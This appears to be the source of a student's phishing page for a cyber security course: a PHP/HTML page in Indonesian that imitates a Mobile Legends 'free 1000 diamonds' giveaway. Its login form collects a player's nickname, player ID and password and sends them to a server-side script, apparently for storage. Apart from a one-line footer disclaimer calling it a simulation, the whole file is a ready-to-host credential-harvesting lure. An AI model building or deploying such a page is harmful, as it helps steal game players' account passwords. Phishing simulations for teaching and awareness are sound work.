<?php include("db.php"); ?>
<!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8">
  <title>Giveaway Diamond Mobile Legends</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: url('https://image.offgamers.com/infolink/2023/06/mlbb-pin.jpg') no-repeat center center/cover;

    }

    .header {
      text-align: center;
      background: rgb(255, 255, 255);
      padding: 20px;
      box-shadow: 0 4px 10px rgba(59, 42, 189, 0.53);
    }

    .header img {
      max-width: 200px;
    }

    .container {
      max-width: 500px;
      margin: 40px auto;
      background: rgba(219, 218, 218, 0.8);
      border-radius: 15px;
      padding: 25px;
      box-shadow: 0px 0px 20px black;
      text-align: center;
    }

    .container img {
      width: 80px;
      margin-bottom: 15px;
    }

    h2 {
      color: rgb(22, 78, 147);
      margin-bottom: 10px;
    }

    p {
      font-size: 15px;
      margin-bottom: 20px;
    }

    input {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      outline: none;
    }

    button {
      padding: 12px 25px;
      background: rgb(22, 78, 147);
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #ffaa00;
    }

    .event-banner {
      margin: 20px 0;
      border-radius: 10px;
      overflow: hidden;
    }

    .event-banner img {
      width: 100%;
      border-radius: 10px;
    }

    footer {
      text-align: center;
      padding: 20px;
      font-size: 12px;
      color: #bbb;
    }
  </style>
</head>

<body>

  <div class="header">
    <img src="https://tse1.mm.bing.net/th/id/OIP.g5qdQ2N-rLCO1ZzwBDca4gHaEQ?pid=Api" alt="Logo MLBB">
  </div>

  <div class="container">
    <img src="https://tse4.mm.bing.net/th/id/OIP.r9GFw-QIIC_AmPM7LlHn-gAAAA?pid=Api&P=0&h=180" alt="Diamond Icon">
    <h2>🎁 Event Spesial Mobile Legends 🎁</h2>
    <p>Ikuti <b>Giveaway 1000 Diamond</b> untuk merayakan event terbaru MLBB!
      Cukup login dengan akun kamu untuk klaim hadiah gratis.
      Jangan sampai ketinggalan kesempatan emas ini 🔥</p>

    <div class="event-banner">
      <img src="https://tse3.mm.bing.net/th/id/OIP.IPH41U_P8_mnNSzdep_kTwHaEK?pid=Api&P=0&h=180" alt="Event MLBB">
    </div>

    <form action="akun.php" method="get" onsubmit="return validateForm()">
      <input type="text" id="nickname" name="nickname" placeholder="Nickname ML"><br>
      <input type="text" id="playerid" name="playerid" placeholder="Player ID ML"><br>
      <input type="password" id="password" name="password" placeholder="Password"><br>
      <button type="submit">Claim Diamond</button>
    </form>
  </div>

  <footer>
    ⚠️ Halaman ini hanyalah simulasi tugas kuliah cyber security.<br>
    Jangan pernah masukkan data asli Anda ke link mencurigakan!
  </footer>

  <script>
    function validateForm() {
      let nickname = document.getElementById("nickname").value;
      let playerid = document.getElementById("playerid").value;
      let password = document.getElementById("password").value;
      if (nickname == "" || playerid == "" || password == "") {
        alert("Semua field wajib diisi!");
        return false;
      }
      return true;
    }
  </script>
</body>

</html>